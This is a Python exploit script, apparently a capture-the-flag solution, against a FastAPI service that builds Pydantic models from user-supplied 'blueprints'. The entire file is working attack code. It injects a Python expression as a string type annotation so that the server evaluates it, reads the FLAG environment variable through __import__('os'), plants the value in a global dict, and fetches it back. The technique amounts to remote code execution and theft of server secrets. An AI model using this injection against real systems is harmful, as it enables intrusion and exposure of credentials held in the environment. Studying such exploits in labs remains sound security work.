#!/usr/bin/env python3
import argparse, json, time, uuid
import urllib.request, urllib.error


def req(method, url, data=None):
    body = None
    headers = {}
    if data is not None:
        if isinstance(data, str):
            body = data.encode()
            headers['Content-Type'] = 'application/json'
        else:
            body = json.dumps(data).encode()
            headers['Content-Type'] = 'application/json'
    r = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            raw = resp.read().decode('utf-8', 'replace')
            return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode('utf-8', 'replace')
        return e.code, raw


def exploit(base, item_name=None, blueprint_name=None):
    base = base.rstrip('/')
    suffix = uuid.uuid4().hex[:10]
    item_name = item_name or f'flag_{suffix}'
    blueprint_name = blueprint_name or f'bp_{suffix}'

    # Pydantic evaluates string annotations in the caller frame.
    # This expression stores os.environ['FLAG'] in the global FastAPI items dict,
    # then returns str so schema generation/validation remains valid.
    expr = f"(items.__setitem__({item_name!r}, __import__('os').environ.get('FLAG', 'NO_FLAG_IN_ENV')) or str)"
    desc = {"field": expr}

    st1, body1 = req('POST', f'{base}/blueprint/{blueprint_name}', desc)
    st2, body2 = req('GET', f'{base}/item/{item_name}')
    print(f'[+] base={base}')
    print(f'[+] blueprint={blueprint_name}')
    print(f'[+] item={item_name}')
    print(f'[+] payload={json.dumps(desc)}')
    print(f'[+] POST /blueprint/{blueprint_name} status={st1} body={body1}')
    print(f'[+] GET  /item/{item_name} status={st2} body={body2}')
    try:
        val = json.loads(body2)
    except Exception:
        val = body2
    print(f'[+] extracted={val}')
    return val


if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('base')
    ap.add_argument('--item')
    ap.add_argument('--blueprint')
    args = ap.parse_args()
    exploit(args.base, args.item, args.blueprint)
